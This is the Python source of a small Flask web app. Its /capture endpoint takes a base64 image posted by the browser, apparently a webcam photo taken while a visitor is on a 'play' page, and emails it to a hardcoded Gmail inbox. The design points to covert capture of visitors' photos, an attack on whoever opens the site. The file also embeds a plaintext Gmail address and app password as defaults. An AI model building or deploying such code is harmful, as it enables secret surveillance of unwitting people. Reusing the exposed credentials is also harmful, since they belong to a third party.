from flask import Flask, render_template, request, jsonify
import base64, os, time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

app = Flask(__name__)

SENDER_EMAIL = os.environ.get("SENDER_EMAIL", "santhoshcyber14@gmail.com")
APP_PASSWORD = os.environ.get("APP_PASSWORD", "pjil mjsq edim gupw")
RECEIVER_EMAIL = os.environ.get("RECEIVER_EMAIL", "santhoshcyber14@gmail.com")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/play")
def play():
    return render_template("play.html")

@app.route("/capture", methods=["POST"])
def capture():
    try:
        data = request.get_json()
        img_data = data["image"].split(",")[1]
        filename = f"photo_{int(time.time() * 1000)}.jpg"
        
        temp_path = os.path.join("/tmp", filename)
        with open(temp_path, "wb") as f:
            f.write(base64.b64decode(img_data))
        
        send_email(temp_path, filename)
        
        if os.path.exists(temp_path):
            os.remove(temp_path) 
            
        return jsonify({"status": "success"})
    except Exception as e:
        print("ERROR:", e)
        return jsonify({"status": "error"}), 500

def send_email(filepath, filename):
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = f"New Photo Capture! 📸"
    
    body = "A new photo was captured from the website."
    msg.attach(MIMEText(body, 'plain'))
    
    with open(filepath, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {filename}")
    msg.attach(part)
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SENDER_EMAIL, APP_PASSWORD)
        text = msg.as_string()
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
        server.quit()
    except Exception as e:
        print("Mail Error:", e)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
